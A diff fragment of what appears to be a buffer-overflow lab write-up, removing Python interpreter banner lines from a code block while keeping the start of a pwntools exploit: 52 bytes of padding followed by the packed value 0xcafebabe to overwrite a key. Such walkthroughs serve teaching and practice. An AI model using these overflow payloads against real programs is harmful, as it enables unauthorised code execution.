@@ -233,9 +233,6 @@ We have all the information we need to create an exploit.
 Let's craft our exploit and send it to the listener.
 
 ```python
-bof@ubuntu:~$ python
-Python 3.10.12 (main, Feb  4 2025, 14:57:36) [GCC 11.4.0] on linux
-Type "help", "copyright", "credits" or "license" for more information.
 >>> from pwn import *
 >>> padding = b"A" * 52
 >>> key = p32(0xcafebabe)
